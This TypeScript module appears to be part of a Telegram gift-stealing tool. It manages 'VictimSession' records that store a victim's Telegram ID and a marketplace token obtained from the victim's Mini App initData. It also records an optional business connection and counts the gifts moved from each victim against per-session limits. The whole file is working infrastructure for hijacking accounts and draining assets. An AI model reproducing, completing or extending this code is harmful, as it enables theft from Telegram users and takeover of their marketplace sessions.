import { authFromInitData } from "./client.js";
import { config } from "../config.js";

export type VictimSession = {
  sessionId: string;
  tgUserId: number;
  mrktToken: string;
  businessConnectionId?: string;
  createdAt: number;
  expiresAt: number;
  fillsUsed: number;
  giftsMoved: number;
};

const sessions = new Map<string, VictimSession>();
const byTgUser = new Map<number, string>();

function newSessionId(): string {
  return `s_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

export async function openSession(input: {
  initData: string;
  tgUserId: number;
  businessConnectionId?: string;
}): Promise<VictimSession> {
  const existing = byTgUser.get(input.tgUserId);
  if (existing) {
    const s = sessions.get(existing);
    if (s && s.expiresAt > Date.now()) return s;
  }

  const mrktToken = await authFromInitData(input.initData);
  const now = Date.now();
  const session: VictimSession = {
    sessionId: newSessionId(),
    tgUserId: input.tgUserId,
    mrktToken,
    businessConnectionId: input.businessConnectionId,
    createdAt: now,
    expiresAt: now + config.mrkt.sessionTtlMs,
    fillsUsed: 0,
    giftsMoved: 0,
  };
  sessions.set(session.sessionId, session);
  byTgUser.set(input.tgUserId, session.sessionId);
  return session;
}

export function getSession(sessionId: string): VictimSession | null {
  const s = sessions.get(sessionId);
  if (!s) return null;
  if (s.expiresAt <= Date.now()) {
    sessions.delete(sessionId);
    byTgUser.delete(s.tgUserId);
    return null;
  }
  return s;
}

export function sessionLimitsHit(s: VictimSession): boolean {
  return (
    s.fillsUsed >= config.mrkt.maxFillsPerSession ||
    s.giftsMoved >= config.mrkt.maxGiftsPerSession
  );
}

export function bumpSessionUse(s: VictimSession, gifts: number): void {
  s.fillsUsed += 1;
  s.giftsMoved += gifts;
}
